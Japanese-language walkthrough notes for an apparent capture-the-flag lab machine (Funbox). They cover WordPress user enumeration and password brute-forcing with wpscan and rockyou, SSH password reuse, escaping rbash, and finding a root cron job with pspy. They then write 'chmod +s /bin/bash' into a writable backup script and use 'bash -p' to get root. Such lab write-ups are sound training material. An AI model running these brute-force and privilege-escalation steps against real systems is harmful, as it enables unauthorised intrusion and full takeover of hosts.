### 論点
- pspy,backup.sh
### keyword
- ドメインの設定,wordpress,wpscan,cron

## 攻略
- nmap
  - 21,22,80,33060
  - /etc/hostsを書き換えないとサイト見れない
- サイトを見る
  - ソースは何もない
- gobusterする
  - /secret/
- ユーザを探す
  - `wpscan --url http://funbox.fritz.box/ -e u --ignore-main-redirect`
  - `--ignore-main-redirect`リダイレクトするのでつける
  - うまくいかなければ、updateする
  - admin,joeユーザを見つかる
- ログインパスワードをbrute forceで探す
  - `wpscan --url http://funbox.fritz.box/ -U joe -P /usr/share/wordlists/rockyou.txt --ignore-main-redirect`
- 本来はwordpressのログインだが、ここでは使いまわしているとしてsshでログインする
  - `ssh joe@$IP` 12345
- システム内の探索
  - joeの`.bash_history`を見てみる
  - ユーザを探すとfunnyがいるのがわかる
  - `uname -a`
    - 64bitであることがわかる 
- sudo -l
  - sudoは設定されていない 
- SUIDをしようとするとrbashなのでダメとなる
  - `bash -i` これで通常のbashが使える。`bash -i`を使うと新しいプロセスでbashを起動できる。psコマンドを見たらわかるが、rbashの他にbashコマンドが起動しているのがわかる
  - 改めてsuidする
  - pkexecが多分使える
- `ps aux | grep root`
  - cronが動いているのがわかる
  - pspy64を取得して実行する
- cronが動いていそうなので`.backup.sh`を探す
  - joeにmboxというのがあって中を読むとbackupしているとある
  - `find / -iname "*backup*" 2>/dev/null`
- 
  - `vim /home/funny/.backup.sh`
  - `chmod +s /bin/bash`このコマンドを.backup.shの一番下に書く
  - reverse-shellを使った他のやり方でもrootを取得できる。thalesを参照する
- 時間が経ってls -la /bin/bashでpermmisionがsになるのを待つ
- rootになる
  - /bin/bashのパーミッションをsに変えたので、`-p`をつけることで実ユーザから実効ユーザのrootになることができる
  - `bash -p`


